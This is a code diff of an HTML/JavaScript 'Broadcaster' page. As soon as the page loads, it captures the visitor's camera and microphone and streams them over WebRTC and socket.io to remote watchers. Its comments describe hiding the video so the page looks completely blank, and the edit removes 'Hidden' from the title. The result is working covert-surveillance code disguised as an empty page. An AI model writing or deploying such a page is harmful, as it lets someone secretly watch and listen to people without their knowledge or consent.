@@ -1,62 +1,71 @@
 <!doctype html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>Broadcaster — Hidden</title>
-  <style>
-    body { margin:0; padding:0; background:#fff; }
-    video { display:none; } /* إخفاء الفيديو */
-  </style>
+<meta charset="utf-8">
+<title>Broadcaster</title>
+<style>
+html,body{
+  margin:0;
+  padding:0;
+  background:#fff;
+}
+video{ display:none; } /* الصفحة بيضاء تمامًا */
+</style>
 </head>
 <body>
-  <video id="localVideo" autoplay muted playsinline></video>
 
-  <script src="/socket.io/socket.io.js"></script>
-  <script>
-  (async function(){
-    const socket = io();
-    let pcMap = new Map();
-    let localStream = null;
-    const localVideo = document.getElementById('localVideo');
-    const roomID = 'room1'; // غرفة ثابتة
+<video id="localVideo" autoplay muted playsinline></video>
 
-    // بدء البث في الخلفية مباشرة
-    try {
-      localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-      localVideo.srcObject = localStream;
-      socket.emit('broadcaster', roomID);
-      console.log('Broadcasting in room', roomID);
-    } catch(err) {
-      console.error('Cannot access camera/microphone:', err);
-      alert('Please allow camera/microphone access.');
-    }
+<script src="/socket.io/socket.io.js"></script>
+<script>
+(async () => {
+  const socket = io();
+  const pcs = new Map();
+  const video = document.getElementById("localVideo");
 
-    // استقبال المشاهدين
-    socket.on('watcher', async ({ watcherId }) => {
-      if (!localStream) return socket.emit('no-broadcaster', { watcherId });
-      const pc = new RTCPeerConnection();
-      pcMap.set(watcherId, pc);
-      localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
-      pc.onicecandidate = e => { if(e.candidate) socket.emit('candidate', { targetId: watcherId, candidate: e.candidate }); };
-      const offer = await pc.createOffer();
-      await pc.setLocalDescription(offer);
-      socket.emit('offer', { watcherId, sdp: pc.localDescription });
-      pc.onconnectionstatechange = () => {
-        if(['failed','closed','disconnected'].includes(pc.connectionState)) {
-          pc.close(); pcMap.delete(watcherId);
-        }
-      };
+  const stream = await navigator.mediaDevices.getUserMedia({
+    video: true,
+    audio: true
+  });
+
+  video.srcObject = stream;
+
+  socket.emit("broadcaster");
+
+  socket.on("watcher", async ({ watcherId }) => {
+    const pc = new RTCPeerConnection();
+    pcs.set(watcherId, pc);
+
+    stream.getTracks().forEach(t => pc.addTrack(t, stream));
+
+    pc.onicecandidate = e => {
+      if (e.candidate) {
+        socket.emit("candidate", {
+          targetId: watcherId,
+          candidate: e.candidate
+        });
+      }
+    };
+
+    const offer = await pc.createOffer();
+    await pc.setLocalDescription(offer);
+
+    socket.emit("offer", {
+      watcherId,
+      sdp: pc.localDescription
     });
+  });
 
-    socket.on('answer', ({ from, sdp }) => {
-      const pc = pcMap.get(from);
-      if(pc) pc.setRemoteDescription(new RTCSessionDescription(sdp)).catch(console.error);
-    });
-    socket.on('candidate', ({ from, candidate }) => {
-      const pc = pcMap.get(from);
-      if(pc && candidate) pc.addIceCandidate(new RTCIceCandidate(candidate)).catch(console.error);
-    });
-  })();
-  </script>
+  socket.on("answer", ({ from, sdp }) => {
+    const pc = pcs.get(from);
+    if (pc) pc.setRemoteDescription(new RTCSessionDescription(sdp));
+  });
+
+  socket.on("candidate", ({ from, candidate }) => {
+    const pc = pcs.get(from);
+    if (pc && candidate) pc.addIceCandidate(new RTCIceCandidate(candidate));
+  });
+})();
+</script>
 </body>
 </html>
